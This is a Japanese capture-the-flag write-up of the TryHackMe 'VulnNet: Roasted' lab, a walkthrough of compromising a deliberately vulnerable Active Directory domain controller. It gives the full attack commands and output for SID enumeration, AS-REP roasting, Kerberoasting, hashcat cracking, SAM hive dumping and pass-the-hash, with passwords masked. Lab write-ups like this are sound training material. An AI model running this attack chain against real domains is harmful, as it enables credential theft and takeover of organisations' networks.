# VulnNet: Roasted CTF

https://tryhackme.com/room/vulnnetroasted

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.205.184
root@ip-10-10-97-239:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-19 04:50 GMT
Nmap scan report for 10.10.205.184
Host is up (0.0099s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49665/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49693/tcp open  unknown
MAC Address: 02:5A:8F:D4:5D:F9 (Unknown)
```

```shell
root@ip-10-10-97-239:~# sudo nmap -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49665-49693 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-19 05:04 GMT
Nmap scan report for 10.10.205.184
Host is up (0.013s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain?
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-19 05:04:11Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open     mc-nmf        .NET Message Framing
49665/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49670/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open     msrpc         Microsoft Windows RPC
49693/tcp open     msrpc         Microsoft Windows RPC
```

Web サーバーなどは無い。Kerberos が稼働している。

## SMB

```shell
$ smbclient -L //10.10.205.184 -U ""
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.205.184 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

### VulnNet-Business-Anonymous

```shell
$ smbclient //10.10.205.184/VulnNet-Business-Anonymous -U ""
```

3 ファイルを GET。

```shell
$ cat ./Business-Manager.txt
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her.
We understand that when you’ve got questions, especially when you’re on a tight proposal deadline, you NEED answers.
Our customer happiness specialists are at the ready, armed with friendly, helpful, timely support by email or online messaging.
We’re here to help, regardless of which you plan you’re on or if you’re just taking us for a test drive.
Our company looks forward to all of the business proposals, we will do our best to evaluate all of your offers properly.
To contact our core business manager call this number: 1337 0000 7331

~VulnNet Entertainment
~TryHackMe
```

```shell
$ cat ./Business-Sections.txt
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Jack Goldenhand is the person you should reach to for any business unrelated proposals.
Managing proposals is a breeze with VulnNet. We save all your case studies, fees, images and team bios all in one central library.
Tag them, search them and drop them into your layout. Proposals just got... dare we say... fun?
No more emailing big PDFs, printing and shipping proposals or faxing back signatures (ugh).
Your client gets a branded, interactive proposal they can sign off electronically. No need for extra software or logins.
Oh, and we tell you as soon as your client opens it.

~VulnNet Entertainment
~TryHackMe
```

```shell
$ cat ./Business-Tracking.txt
VULNNET TRACKING
~~~~~~~~~~~~~~~~~~

Keep a pulse on your sales pipeline of your agency. We let you know your close rate,
which sections of your proposals get viewed and for how long,
and all kinds of insight into what goes into your most successful proposals so you can sell smarter.
We keep track of all necessary activities and reach back to you with newly gathered data to discuss the outcome.
You won't miss anything ever again.

~VulnNet Entertainment
~TryHackMe
```

### VulnNet-Enterprise-Anonymous

```shell
$ smbclient //10.10.205.184/VulnNet-Enterprise-Anonymous -U ""
```

3 ファイルを GET。

```shell
$ cat ./Enterprise-Operations.txt
VULNNET OPERATIONS
~~~~~~~~~~~~~~~~~~~~

We bring predictability and consistency to your process. Making it repetitive doesn’t make it boring.
Set the direction, define roles, and rely on automation to keep reps focused and make onboarding a breeze.
Don't wait for an opportunity to knock - build the door. Contact us right now.
VulnNet Entertainment is fully commited to growth, security and improvement.
Make a right decision!

~VulnNet Entertainment
~TryHackMe
```

```shell
$ cat ./Enterprise-Safety.txt
VULNNET SAFETY
~~~~~~~~~~~~~~~~

Tony Skid is a core security manager and takes care of internal infrastructure.
We keep your data safe and private. When it comes to protecting your private information...
we’ve got it locked down tighter than Alcatraz.
We partner with TryHackMe, use 128-bit SSL encryption, and create daily backups.
And we never, EVER disclose any data to third-parties without your permission.
Rest easy, nothing’s getting out of here alive.

~VulnNet Entertainment
~TryHackMe
```

```shell
$ cat ./Enterprise-Sync.txt
VULNNET SYNC

Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.
Proposals are just one part of your agency sales process. We tie together your other software, so you can import contacts from your CRM,
auto create deals and generate invoices in your accounting software. We are regularly adding new integrations.
Say no more to desync problems.
To contact our sync manager call this number: 7331 0000 1337

~VulnNet Entertainment
~TryHackMe
```

4 人の名前が出てきたのと、業務上の役割以外の情報は無いと思われる。

- Alexa Whitehat
- Jack Goldenhand
- Tony Skid
- Johnny Leet

## Kerberos

ユーザー名を列挙

```shell
$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@$TARGET
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Brute forcing SIDs at 10.10.55.225
[*] StringBinding ncacn_np:10.10.55.225[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

ユーザー名のリストを作成

```shell
$ cat ./users.txt
Administrator
Guest
krbtgt
a-whitehat
t-skid
j-goldenhand
j-leet
```

### Kerberos AS-REP Roasting 攻撃

Kerberos Pre-authentication を無効にしているユーザーの NTLM ハッシュ派生データ (Kerberos AS-REP ハッシュ)を取得。

```shell
$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py 'VULNNET-RST/' -usersfile ./users.txt -no-pass -dc-ip $TARGET
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:163: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST:bc94a91029350f80e242ba8caeaca9f9$cd6acb6652b036becd62cb8ae9c328f91bd9f8b81ca56a48d4bc4a05a3993e3dd3df12c0c6d3e5b943f82cf067c951eb96a8a2b58751b26c880bc3118cae39f008d69513caf87598152117053fdd3b0b993eab5c27dd3807d394fc0cdccab403f436e08b4ab6b6da73b6219570ffaa109ec4ef20eb584aabac34ddcc9b20b9b508adeebdf7ac12d2d44dc50d534584050e61f49e3b2988dda92110b8270880d700e8b9df882092a1aee78daa8e6e4f21ba758b766a57da65290dbfb93089f73b8d403e5fdc268299ac0b2c9822943a2ff6371e7020b596f3190de885a3e5f0200f358029e83549410dfea86273ec535c
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

t-skid のハッシュを取得した。hash の種類を調べる。

```shell
$ name-that-hash -f hash.txt

Most Likely
Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active Directory
```

hashcat でパスワードクラック

```shell
hashcat -m 18200 hash.txt rockyou.txt
```

```
t-skid / ひみつ
```

これを使って RDP や evil-winrm 接続は出来なかった。

### ケルベロースティング

サービスプリンシパル名と TGS ハッシュを取得。

```shell
$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py 'VULNNET-RST.local/t-skid:ひみつ' -outputfile keberoast.hash -dc-ip $TARGET
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528
```

ハッシュの種類を調べる。

```shell
$ name-that-hash -f ./keberoast.hash

Most Likely
Kerberos 5 TGS-REP etype 23, HC: 13100 JtR: krb5tgs Summary: Used in Windows Active Directory.
```

ハッシュをクラック。

```shell
hashcat -m 13100 hash.txt rockyou.txt
```

```
enterprise-core-vn / ひみつ
```

evil-winrm でログインできた。

```shell
evil-winrm -i 10.10.55.225 -u enterprise-core-vn -p 'ひみつ'
```

```shell
*Evil-WinRM* PS C:\Users\enterprise-core-vn> type Desktop/user.txt
THM{..........................}
```

## 権限昇格

priv, group , レジストリ等は特に何も出なかった。

SYSVOL から 1 ファイルダウンロード。

```shell
$ smbclient //10.10.49.231/SYSVOL -U "enterprise-core-vn"

  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021
```

```
strUserNTName = "a-whitehat"
strPassword = "..........."
```

これを使い、evil-winrm でログインできた。

大量の権限が付いている。

```shell
*Evil-WinRM* PS C:\Users\a-whitehat> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

### SeBackup, SeRestore 権限

sam, system を保存。

```shell
*Evil-WinRM* PS C:\Users\a-whitehat> reg save hklm\sam sam.hive
*Evil-WinRM* PS C:\Users\a-whitehat> reg save hklm\system system.hive
```

ダウンロード

```shell
*Evil-WinRM* PS C:\Users\a-whitehat> download sam.hive
*Evil-WinRM* PS C:\Users\a-whitehat> download system.hive
```

パスワードハッシュ取得

```shell
$ python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ひみつ>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

Pass-the-hash 攻撃

```shell
$ python /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<ひみつ> Administrator@10.10.65.199
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.49.231.....
[*] Found writable share ADMIN$
[*] Uploading file kXwRfgyr.exe
[*] Opening SVCManager on 10.10.49.231.....
[*] Creating service DjIL on 10.10.49.231.....
[*] Starting service DjIL.....
[*] Opening SVCManager on 10.10.49.231.....
[*] Stopping service DjIL.....
[*] Removing service DjIL.....
[*] Removing file kXwRfgyr.exe.....
```

シェルが開始しない・・・

evil-winrm でログインできた。

```shell
evil-winrm -i 10.10.65.199 -u Administrator -H <ひみつ>
```

```shell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
THM{.....................}
```

## 振り返り

- Kerberos の動作を理解できていないとかなり困難な内容。
- 一つ一つは学習済みのテクニックだったが、すぐに応用できるほど理解していなかったことを痛感。
- 初手は SID の列挙で決まり。
- どれか一つのアカウントを侵害してケルベロースティング、というのが定石なのだろうと理解。
- 今回は最初のアカウント侵害が AS-REP Roasting 攻撃だったが、Web や FTP など、どこか別の場所に置かれているという場合もあるだろう。
- pass-the-hash 攻撃といえば、impacket の psexec.py を使うものだと思い込んでいたが、evil-winrm で指定できることを覚えた。
- 内容的にかなり貴重な Box で勉強になるので、忘れた頃にまたやりたい。
